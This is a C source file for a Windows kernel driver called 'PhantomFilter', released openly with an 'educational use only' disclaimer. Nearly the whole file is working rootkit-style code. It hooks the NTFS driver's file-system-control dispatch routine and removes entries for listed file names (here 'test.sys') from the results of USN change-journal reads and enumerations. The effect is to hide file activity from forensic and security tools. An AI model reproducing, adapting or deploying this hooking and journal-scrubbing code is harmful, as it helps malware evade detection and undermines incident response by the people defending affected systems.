/*
 * PhantomFilter - World's First USN Journal Filtering Driver
 *
 * Copyright (c) 2026 odin-xd/Cruz/Exp
 * All rights reserved.
 *
 * This software is provided for educational and research purposes only.
 * The authors do not condone or support the use of this software for
 * malicious purposes or illegal activities.
 *
 * Permission is hereby granted, free of charge, to any person obtaining
 * a copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 * Educational Use Only - This code demonstrates Windows USN journal security
 * research techniques and should only be used for legitimate security
 * research, education, and authorized testing purposes.
 *
 * WORLD'S FIRST implementation of transparent USN journal filtering
 * Conceived, designed, and implemented by odin-xd
 */

#include <ntifs.h>
#include <ntddk.h>

static PDRIVER_OBJECT g_NtfsDriverObject = NULL;
static PDRIVER_DISPATCH g_OriginalFsControl = NULL;

const char* g_HiddenFiles[] = {
    "test.sys",
    NULL
};

BOOLEAN ShouldHideFile(PCSTR fileName)
{
    if (!fileName) return FALSE;
    
    for (int i = 0; g_HiddenFiles[i] != NULL; i++) {
        if (_stricmp(fileName, g_HiddenFiles[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}
BOOLEAN ShouldHideFileW(PWCHAR fileName, USHORT length)
{
    if (!fileName || length == 0) return FALSE;
    
    char buffer[260];
    USHORT charCount = length / sizeof(WCHAR);
    if (charCount >= 260) charCount = 259;
    
    for (USHORT i = 0; i < charCount; i++) {
        buffer[i] = (char)fileName[i];
    }
    buffer[charCount] = 0;
    
    return ShouldHideFile(buffer);
}

NTSTATUS PrivateFsControlInterceptor(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
    ULONG fsControlCode = irpStack->Parameters.FileSystemControl.FsControlCode;
    
    if (fsControlCode == FSCTL_READ_USN_JOURNAL || 
        fsControlCode == FSCTL_ENUM_USN_DATA) {
        
        NTSTATUS status = g_OriginalFsControl(DeviceObject, Irp);
        
        if (NT_SUCCESS(status) && status != STATUS_PENDING) {
            if (NT_SUCCESS(Irp->IoStatus.Status) && Irp->IoStatus.Information > sizeof(ULONGLONG)) {
                __try {
                    PVOID buffer = NULL;
                    
                    buffer = Irp->AssociatedIrp.SystemBuffer;
                    if (!buffer) {
                        buffer = Irp->UserBuffer;
                    }
                    if (!buffer && Irp->MdlAddress) {
                        buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
                    }
                    
                    if (buffer && MmIsAddressValid(buffer)) {
                        PUCHAR recordStart = (PUCHAR)buffer + sizeof(ULONGLONG);
                        PUCHAR bufferEnd = (PUCHAR)buffer + Irp->IoStatus.Information;
                        
                        PUCHAR readPtr = recordStart;
                        PUCHAR writePtr = recordStart;
                        ULONG filteredCount = 0;
                        
                        while (readPtr < bufferEnd && readPtr + 8 <= bufferEnd) {
                            if (!MmIsAddressValid(readPtr)) {
                                break;
                            }
                            
                            PUSN_RECORD_V2 pRecord = (PUSN_RECORD_V2)readPtr;
                            
                            if (pRecord->RecordLength == 0 || 
                                pRecord->RecordLength < 60 ||
                                pRecord->RecordLength > (ULONG)(bufferEnd - readPtr)) {
                                break;
                            }
                            USHORT filenameOffset = pRecord->FileNameOffset;
                            if (filenameOffset == 0 || filenameOffset < 60 || filenameOffset >= pRecord->RecordLength) {
                                filenameOffset = 60;
                            }
                            
                            if (filenameOffset >= pRecord->RecordLength) {
                                readPtr += pRecord->RecordLength;
                                readPtr = (PUCHAR)(((ULONG_PTR)readPtr + 7) & ~7);
                                continue;
                            }
                            
                            USHORT maxFileNameLength = pRecord->RecordLength - filenameOffset;
                            USHORT actualFileNameLength = pRecord->FileNameLength;
                            
                            if (actualFileNameLength > maxFileNameLength) {
                                actualFileNameLength = maxFileNameLength;
                            }
                            
                            if (actualFileNameLength == 0 || actualFileNameLength > 512) {
                                actualFileNameLength = maxFileNameLength;
                                if (actualFileNameLength > 512) {
                                    actualFileNameLength = 512;
                                }
                            }
                            
                            PWCHAR fileName = (PWCHAR)((PUCHAR)pRecord + filenameOffset);
                            if (!MmIsAddressValid(fileName)) {
                                readPtr += pRecord->RecordLength;
                                readPtr = (PUCHAR)(((ULONG_PTR)readPtr + 7) & ~7);
                                continue;
                            }
                            
                            char fileNameBuf[260] = {0};
                            USHORT charCount = actualFileNameLength / sizeof(WCHAR);
                            if (charCount >= 260) charCount = 259;
                            
                            USHORT actualCharsRead = 0;
                            for (USHORT i = 0; i < charCount; i++) {
                                PWCHAR charPtr = &fileName[i];
                                if (!MmIsAddressValid(charPtr)) {
                                    break;
                                }
                                if ((PUCHAR)charPtr >= (PUCHAR)pRecord + pRecord->RecordLength) {
                                    break;
                                }
                                fileNameBuf[actualCharsRead++] = (char)(*charPtr);
                            }
                            fileNameBuf[actualCharsRead] = 0;
                            
                            BOOLEAN shouldHide = ShouldHideFile(fileNameBuf);
                            
                            if (shouldHide) {
                                filteredCount++;
                            } else {
                                if (writePtr != readPtr) {
                                    RtlMoveMemory(writePtr, readPtr, pRecord->RecordLength);
                                }
                                writePtr += pRecord->RecordLength;
                                writePtr = (PUCHAR)(((ULONG_PTR)writePtr + 7) & ~7);
                            }
                            
                            readPtr += pRecord->RecordLength;
                            readPtr = (PUCHAR)(((ULONG_PTR)readPtr + 7) & ~7);
                        }
                        if (filteredCount > 0) {
                            ULONG_PTR recordDataSize = (ULONG_PTR)writePtr - (ULONG_PTR)recordStart;
                            ULONG newSize = sizeof(ULONGLONG) + (ULONG)recordDataSize;
                            
                            if (newSize <= (ULONG)Irp->IoStatus.Information) {
                                Irp->IoStatus.Information = newSize;
                            }
                        }
                    }
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                }
            }
        }
        
        return status;
    }
    
    return g_OriginalFsControl(DeviceObject, Irp);
}

NTSTATUS FindNtfsDriver(PDRIVER_OBJECT* NtfsDriver)
{
    UNICODE_STRING volumeName;
    OBJECT_ATTRIBUTES objAttrs;
    HANDLE volumeHandle = NULL;
    IO_STATUS_BLOCK iosb;
    PFILE_OBJECT fileObject = NULL;
    NTSTATUS status;
    
    RtlInitUnicodeString(&volumeName, L"\\??\\C:");
    InitializeObjectAttributes(&objAttrs, &volumeName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    
    status = ZwCreateFile(
        &volumeHandle,
        FILE_READ_DATA,
        &objAttrs,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    status = ObReferenceObjectByHandle(
        volumeHandle,
        FILE_READ_DATA,
        *IoFileObjectType,
        KernelMode,
        (PVOID*)&fileObject,
        NULL);
    
    ZwClose(volumeHandle);
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    PDEVICE_OBJECT deviceObject = IoGetRelatedDeviceObject(fileObject);
    if (!deviceObject) {
        ObDereferenceObject(fileObject);
        return STATUS_UNSUCCESSFUL;
    }
    
    *NtfsDriver = deviceObject->DriverObject;
    ObDereferenceObject(fileObject);
    
    return STATUS_SUCCESS;
}
NTSTATUS InstallTransparentIrpHook()
{
    NTSTATUS status = FindNtfsDriver(&g_NtfsDriverObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    g_OriginalFsControl = g_NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL];
    
    if (!g_OriginalFsControl) {
        return STATUS_UNSUCCESSFUL;
    }
    
    InterlockedExchangePointer(
        (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL],
        PrivateFsControlInterceptor);
    
    return STATUS_SUCCESS;
}

VOID RemoveTransparentIrpHook()
{
    if (g_NtfsDriverObject && g_OriginalFsControl) {
        InterlockedExchangePointer(
            (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL],
            g_OriginalFsControl);
    }
}

VOID PhantomDriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    RemoveTransparentIrpHook();
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    
    NTSTATUS status = InstallTransparentIrpHook();
    
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    DriverObject->DriverUnload = PhantomDriverUnload;
    
    return STATUS_SUCCESS;
}